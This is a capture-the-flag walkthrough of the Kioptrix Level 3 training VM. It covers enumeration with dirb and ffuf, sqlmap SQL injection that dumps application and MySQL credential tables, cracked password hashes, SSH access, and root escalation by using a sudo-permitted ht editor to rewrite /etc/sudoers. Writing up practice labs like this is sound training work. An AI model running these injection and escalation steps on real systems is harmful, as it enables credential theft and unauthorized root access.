# Kioptrix_Level_3 Writeup

first , lets start with network scanning
```bash
 Currently scanning: 10.201.61.14/24   |   Screen View: Unique Hosts                                                                                                                                              
                                                                                                                                                                                                                  
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.201.61.58    d8:a8:81:42:0c:eb      1      60  Unknown vendor                                                                                                                                                 
 10.201.61.124   ea:cc:1b:fa:fe:b0      1      60  Unknown vendor                                                                                                                                                 
 10.201.61.243   00:0c:29:4a:a4:d0      1      60  VMware, Inc.
```
\
Next , we check for open ports 
```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```
\
The readme file from the author says to add 'kioptrix3.com' to /etc/hosts file
\
```bash
dirb http://kioptrix3.com/           

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jan 17 04:02:53 2026
URL_BASE: http://kioptrix3.com/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://kioptrix3.com/ ----
==> DIRECTORY: http://kioptrix3.com/cache/                                                                                                                                                                        
==> DIRECTORY: http://kioptrix3.com/core/                                                                                                                                                                         
+ http://kioptrix3.com/data (CODE:403|SIZE:324)                                                                                                                                                                   
+ http://kioptrix3.com/favicon.ico (CODE:200|SIZE:23126)                                                                                                                                                          
==> DIRECTORY: http://kioptrix3.com/gallery/                                                                                                                                                                      
+ http://kioptrix3.com/index.php (CODE:200|SIZE:1819)                                                                                                                                                             
==> DIRECTORY: http://kioptrix3.com/modules/                                                                                                                                                                      
==> DIRECTORY: http://kioptrix3.com/phpmyadmin/                                                                                                                                                                   
+ http://kioptrix3.com/server-status (CODE:403|SIZE:333)                                                                                                                                                          
==> DIRECTORY: http://kioptrix3.com/style/                                                                                                                                                                        
                                                                                                                                                                                                                  
---- Entering directory: http://kioptrix3.com/cache/ ----
+ http://kioptrix3.com/cache/index.html (CODE:200|SIZE:1819)                                                                                                                                                      
                                                                                                                                                                                                                  
---- Entering directory: http://kioptrix3.com/core/ ----
==> DIRECTORY: http://kioptrix3.com/core/controller/                                                                                                                                                              
+ http://kioptrix3.com/core/index.php (CODE:200|SIZE:0)                                                                                                                                                           
==> DIRECTORY: http://kioptrix3.com/core/lib/                                                                                                                                                                     
==> DIRECTORY: http://kioptrix3.com/core/model/                                                                                                                                                                   
^C> Testing: http://kioptrix3.com/core/smf
```
\
We find /phpmyadmin , but no creds to login, so lets come back later
\
Visiting port 80 gives 
\
<img width="1583" height="567" alt="image" src="https://github.com/user-attachments/assets/bcd54244-fa14-4214-88bf-77f1d10366f0" />
\
then i used ffuf and found 
```bash
http://kioptrix3.com/index.php?system=Users
```
<img width="802" height="470" alt="image" src="https://github.com/user-attachments/assets/f850ee0a-a9bd-4d57-92a9-b14674d464be" />

\
Which shows that it is Lotus CMS and the version , so we check searchsploit
```bash
searchsploit lotus cms                     
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Lotus CMS Fraise 3.0 - Local File Inclusion / Remote Code Execution                                                                                                              | php/webapps/15964.py
```
\
I tried using this , but i could not exploit , so i start looking for other ways
\
then we visit the link /gallery
\
<img width="851" height="693" alt="image" src="https://github.com/user-attachments/assets/f8b89332-8b75-4587-95f9-0eb00bb7f026" />
\
here , after searching for a bit , we reach this url
```bash
http://kioptrix3.com/gallery/gallery.php?id=1
```
Next , we use sqlmap 
```bash
sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1 --level 3 --risk 3 --dump
```
\
WE dump some data
```bash
Database: gallery
Table: gallarific_users
[1 entry]
+--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+
| userid | email   | photo   | website | joincode | lastname | password | username | usertype  | firstname | datejoined | issuperuser |
+--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+
| 1      | <blank> | <blank> | <blank> | <blank>  | User     | n0t7t1k4 | admin    | superuser | Super     | 1302628616 | 1           |
+--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+
```
\
Tried tto login into lotus cms with this creds , but didnt work
\
also got 
```bash
Database: gallery
Table: dev_accounts
[2 entries]
+----+----------------------------------+------------+
| id | password                         | username   |
+----+----------------------------------+------------+
| 1  | 0d3eccfb887aabd50f243b3f155c0f85 | dreg       |
| 2  | 5badcaf789d3d1d09794d8f021f40f0e | loneferret |
+----+----------------------------------+------------+
```
\
We can decode using online tools , dreg:Mast3r and loneferret:starwars
\
But again no use , then i check for other dbs
```bash
sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1 --level 3 --risk 3 --dbs
```
\
```bash
[03:51:57] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: Apache 2.2.8, PHP 5.2.4, PHP
back-end DBMS: MySQL >= 4.1
[03:51:57] [INFO] fetching database names
[03:51:57] [INFO] retrieved: 'information_schema'
[03:51:57] [INFO] retrieved: 'gallery'
[03:51:57] [INFO] retrieved: 'mysql'
```
So lets enumerate mysql db
\
```bash
 sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1 --level 3 --risk 3 -D mysql --dump
```
\
Then after some extra data ,WE simplify to 
```bash
 sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1 --level 3 --risk 3 -D mysql -T user --dump --hex -C User,Password
```
\
```bash
Database: mysql
Table: user
[6 entries]
+------------------+-------------------------------------------+
| User             | Password                                  |
+------------------+-------------------------------------------+
| <blank>          | <blank>                                   |
| <blank>          | <blank>                                   |
| debian-sys-maint | *F46D660C8ED1B312A40E366A86D958C6F1EF2AB8 |
| root             | *47FB3B1E573D80F44CD198DC65DE7764795F948E |
| root             | *47FB3B1E573D80F44CD198DC65DE7764795F948E |
| root             | *47FB3B1E573D80F44CD198DC65DE7764795F948E |
+------------------+-------------------------------------------+
```
\
We use online tool to crack
\
```bash
47fb3b1e573d80f44cd198dc65de7764795f948e:fuckeyou
```
\
Now from the username root , i think about trying in phpmyadmin and login , then i realize , we could have just logged in using ssh 
\
So we login using
```bash
ssh -o HostKeyAlgorithms=+ssh-rsa loneferret@kioptrix3.com
```
\
Then checking sudo -l
```bash
sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
```
\
After searching for a bit , we find that ht is a text editor https://github.com/sebastianbiallas/ht
We open it using 
```bash
sudo -u root /usr/local/bin/ht
```
\
Then press F3 , then type file  to edit it 
\
<img width="483" height="323" alt="image" src="https://github.com/user-attachments/assets/74830486-72c2-4c24-83e0-63d5302be1f6" />
\
We can either add a new root user or edit /etc/sudoers to give all permissions to user loneferrret 
\
<img width="483" height="323" alt="image" src="https://github.com/user-attachments/assets/9f6160b7-291c-42ba-8158-5046cd6537cc" />
\
```bash
loneferret@Kioptrix3:~$ sudo -l
[sudo] password for loneferret: 
User loneferret may run the following commands on this host:
    (ALL) ALL
loneferret@Kioptrix3:~$ sudo su
root@Kioptrix3:/home/loneferret# 
```
\
Congrats Note
```bash
root@Kioptrix3:~# cat Congrats.txt 
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone. 
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.


I hope you enjoyed this third challenge.

Steven McElrea
aka loneferret
http://www.kioptrix.com


Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.

Main page CMS: 
http://www.lotuscms.org

Gallery application: 
Gallarific 2.1 - Free Version released October 10, 2009
http://www.gallarific.com
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
http://www.exploit-db.com/exploits/15891/

The HT Editor can be found here:
http://hte.sourceforge.net/downloads.html
And the vulnerable version on Exploit-DB here:
http://www.exploit-db.com/exploits/17083/


Also, all pictures were taken from Google Images, so being part of the
public domain I used them.
```
The End , thank you for reading till here
